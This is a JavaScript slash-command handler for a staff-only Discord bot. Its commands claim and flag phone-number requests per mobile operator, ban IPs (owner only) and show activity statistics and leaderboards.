/**
 * slash.js — Slash command handler
 *
 * v2:
 *  - /banip is now OWNER-ONLY. It is also the only way to ban an IP: the
 *    "Ban IP" button was removed from every embed (buttons.js / polling.js).
 *  - /claim now passes the caller's Discord ID to the API and records the
 *    claim locally. Before, it sent no ID, so the request ended up claimed
 *    by nobody: the "code submitted" DM couldn't find its claimer and fell
 *    back to posting the code in the public channel, and the claimer-only
 *    button lock had nothing to enforce.
 *  - Replies come back from the API in French no matter what; they're now
 *    translated into the caller's language (tApi).
 *  - deferReply is wrapped: an expired token no longer surfaces as a scary
 *    "Interaction error" stack trace. Language is read AFTER the defer via
 *    getLang — the preference cache is in memory, so this is instant, and
 *    the reply is now correct even the first time after a restart.
 */

import { EmbedBuilder } from "discord.js";
import { CONFIG } from "../config.js";
import {
    getGlobalStats,
    getTodayStats,
    getOperatorStats,
    getHourlyStats,
    getStaffLeaderboard,
    getStaffActivity,
    getPersonalStats,
    getRecentActions,
} from "../database.js";
import {
    buildStatsEmbed,
    buildOperatorStatsEmbed,
    buildLeaderboardEmbed,
    buildHourlyStatsEmbed,
    buildStaffActivityEmbed,
    buildStaffDetailEmbed,
    buildPanelEmbed,
} from "../utils/embedBuilder.js";
import { callStaffAction, callBanIP } from "../utils/api.js";
import { setClaimer } from "../utils/claimStore.js";
import { isStaff, isOwner } from "../utils/permissions.js";
import { getLang, peekLang } from "../utils/userPrefs.js";
import { t, tApi } from "../utils/i18n.js";

/** Public deferReply that never throws. Returns false if the token was already dead. */
async function deferPublic(interaction) {
    try {
        await interaction.deferReply();
        return true;
    } catch (e) {
        const ageMs = Date.now() - interaction.createdTimestamp;
        console.warn(`⚠️  Could not defer /${interaction.commandName} (${ageMs}ms old): ${e.message}`);
        return false;
    }
}

export async function handleSlash(interaction) {
    const { commandName } = interaction;

    // peekLang: this runs BEFORE the command has acknowledged the interaction
    // and Discord expires the token after 3 seconds — memory only.
    let lang = peekLang(interaction.user.id);

    // Every command is staff/owner-only — this bot has no commands meant
    // for general server members. isStaff() also returns true for OWNER.
    if (!isStaff(interaction.member)) {
        await interaction.reply({ content: t(lang, "no_permission_command"), flags: 64 }).catch(() => {});
        return;
    }

    // ─── CONFIG ───────────────────────────────────────────────────────────────
    if (commandName === "config") {
        const channel   = interaction.options.getChannel("channel");
        const operateur = interaction.options.getString("operateur");

        if (operateur) {
            // Per-operator channel (Orange / SFR / Bouygues / Belgium)
            // Persisted in-memory for this session (use a real store for multi-restart).
            CONFIG.CHANNELS[operateur] = channel.id;
            await interaction.reply({
                content: t(lang, "config_operator_channel", operateur, `<#${channel.id}>`),
                flags: 64,
            }).catch(() => {});
        } else {
            // Default / fallback channel (used for any operator without a dedicated channel)
            process.env.DISCORD_LOG_CHANNEL_ID = channel.id;
            CONFIG.LOG_CHANNEL_ID = channel.id;
            await interaction.reply({
                content: t(lang, "config_default_channel", `<#${channel.id}>`),
                flags: 64,
            }).catch(() => {});
        }
        return;
    }

    // ─── PANEL ────────────────────────────────────────────────────────────────
    if (commandName === "panel") {
        const embed = buildPanelEmbed();
        await interaction.reply({ embeds: [embed] }).catch(() => {});
        return;
    }

    // ─── BAN IP — OWNER ONLY ──────────────────────────────────────────────────
    // Checked BEFORE deferring so a non-owner gets a private refusal instead
    // of a public "thinking…" that then resolves to an error.
    if (commandName === "banip") {
        if (!isOwner(interaction.member)) {
            await interaction.reply({ content: t(lang, "no_permission_owner"), flags: 64 }).catch(() => {});
            return;
        }
        const ip = interaction.options.getString("ip");
        if (!await deferPublic(interaction)) return;
        lang = await getLang(interaction.user.id);
        try {
            const data = await callBanIP(ip, interaction.user.tag);
            await interaction.editReply({
                content: (data.success ? "🚫 " : "❌ ") + tApi(lang, data.message),
            });
        } catch (e) {
            await interaction.editReply({ content: t(lang, "err_network", e.message) }).catch(() => {});
        }
        return;
    }

    // ─── CLAIM ────────────────────────────────────────────────────────────────
    if (commandName === "claim") {
        const phone = interaction.options.getString("phone");
        if (!await deferPublic(interaction)) return;
        lang = await getLang(interaction.user.id);
        try {
            const data = await callStaffAction("claim", phone, interaction.user.tag, null, interaction.user.id);
            if (data.success) setClaimer(phone, interaction.user.id);
            await interaction.editReply({
                content: (data.success ? "✅ " : "❌ ") + tApi(lang, data.message),
            });
        } catch (e) {
            await interaction.editReply({ content: t(lang, "err_network", e.message) }).catch(() => {});
        }
        return;
    }

    // ─── SET LENGTH ───────────────────────────────────────────────────────────
    if (commandName === "setlength") {
        const phone  = interaction.options.getString("phone");
        const length = interaction.options.getInteger("length");
        if (!await deferPublic(interaction)) return;
        lang = await getLang(interaction.user.id);
        try {
            const data = await callStaffAction("set_length", phone, interaction.user.tag, length);
            await interaction.editReply({
                content: (data.success ? "✅ " : "❌ ") + tApi(lang, data.message),
            });
        } catch (e) {
            await interaction.editReply({ content: t(lang, "err_network", e.message) }).catch(() => {});
        }
        return;
    }

    // ─── WRONG NUMBER ─────────────────────────────────────────────────────────
    if (commandName === "wrongnumber") {
        const phone = interaction.options.getString("phone");
        if (!await deferPublic(interaction)) return;
        lang = await getLang(interaction.user.id);
        try {
            const data = await callStaffAction("wrong_number", phone, interaction.user.tag);
            await interaction.editReply({
                content: (data.success ? "✅ " : "❌ ") + tApi(lang, data.message),
            });
        } catch (e) {
            await interaction.editReply({ content: t(lang, "err_network", e.message) }).catch(() => {});
        }
        return;
    }

    // ─── STATS ────────────────────────────────────────────────────────────────
    if (commandName === "stats") {
        if (!await deferPublic(interaction)) return;
        lang = await getLang(interaction.user.id);
        try {
            const [stats, today] = await Promise.all([getGlobalStats(), getTodayStats()]);
            await interaction.editReply({ embeds: [buildStatsEmbed(stats, today, lang)] });
        } catch (e) {
            console.error("Stats error:", e);
            await interaction.editReply({ content: t(lang, "err_fetch") }).catch(() => {});
        }
        return;
    }

    // ─── TODAY ────────────────────────────────────────────────────────────────
    if (commandName === "today") {
        if (!await deferPublic(interaction)) return;
        lang = await getLang(interaction.user.id);
        try {
            const today = await getTodayStats();
            const embed = new EmbedBuilder()
                .setTitle(t(lang, "today_title"))
                .setColor(0x10b981)
                .addFields(
                    { name: t(lang, "today_requests"),  value: "`" + today.requests  + "`", inline: true },
                    { name: t(lang, "today_completed"), value: "`" + today.completed + "`", inline: true }
                )
                .setFooter({ text: "📅 Snaptech Today" })
                .setTimestamp();
            await interaction.editReply({ embeds: [embed] });
        } catch (e) {
            console.error("Today error:", e);
            await interaction.editReply({ content: t(lang, "err_fetch") }).catch(() => {});
        }
        return;
    }

    // ─── OPERATORS ────────────────────────────────────────────────────────────
    if (commandName === "operators") {
        if (!await deferPublic(interaction)) return;
        lang = await getLang(interaction.user.id);
        try {
            const opStats = await getOperatorStats();
            await interaction.editReply({ embeds: [buildOperatorStatsEmbed(opStats, lang)] });
        } catch (e) {
            console.error("Operators error:", e);
            await interaction.editReply({ content: t(lang, "err_fetch") }).catch(() => {});
        }
        return;
    }

    // ─── ACTIVITY ─────────────────────────────────────────────────────────────
    if (commandName === "activity") {
        if (!await deferPublic(interaction)) return;
        lang = await getLang(interaction.user.id);
        try {
            const hourly = await getHourlyStats();
            await interaction.editReply({ embeds: [buildHourlyStatsEmbed(hourly, lang)] });
        } catch (e) {
            console.error("Activity error:", e);
            await interaction.editReply({ content: t(lang, "err_fetch") }).catch(() => {});
        }
        return;
    }

    // ─── LEADERBOARD ──────────────────────────────────────────────────────────
    if (commandName === "leaderboard") {
        const limit = interaction.options.getInteger("limit") || 10;
        if (!await deferPublic(interaction)) return;
        lang = await getLang(interaction.user.id);
        try {
            const rows = await getStaffLeaderboard(limit);
            await interaction.editReply({ embeds: [buildLeaderboardEmbed(rows, limit, lang)] });
        } catch (e) {
            console.error("Leaderboard error:", e);
            await interaction.editReply({ content: t(lang, "err_fetch") }).catch(() => {});
        }
        return;
    }

    // ─── STAFF ACTIVITY ───────────────────────────────────────────────────────
    if (commandName === "staffactivity") {
        if (!await deferPublic(interaction)) return;
        lang = await getLang(interaction.user.id);
        try {
            const activity = await getStaffActivity();
            await interaction.editReply({ embeds: [buildStaffActivityEmbed(activity, lang)] });
        } catch (e) {
            console.error("Staff activity error:", e);
            await interaction.editReply({ content: t(lang, "err_fetch") }).catch(() => {});
        }
        return;
    }

    // ─── STAFF STATS (one member, in detail) ───────────────────────────
    if (commandName === "staffstats") {
        const target = interaction.options.getUser("user");
        if (!await deferPublic(interaction)) return;
        lang = await getLang(interaction.user.id);
        try {
            // snap_logs.details keys actions by Discord TAG, not ID (see
            // database.js) — same convention as the personal settings panel
            // and the daily-summary DM.
            const staffTag = target.tag || target.username;
            const [personal, recent] = await Promise.all([
                getPersonalStats(staffTag),
                getRecentActions(staffTag, 10),
            ]);
            await interaction.editReply({ embeds: [buildStaffDetailEmbed(target, personal, recent, lang)] });
        } catch (e) {
            console.error("Staffstats error:", e);
            await interaction.editReply({ content: t(lang, "err_fetch") }).catch(() => {});
        }
        return;
    }
}
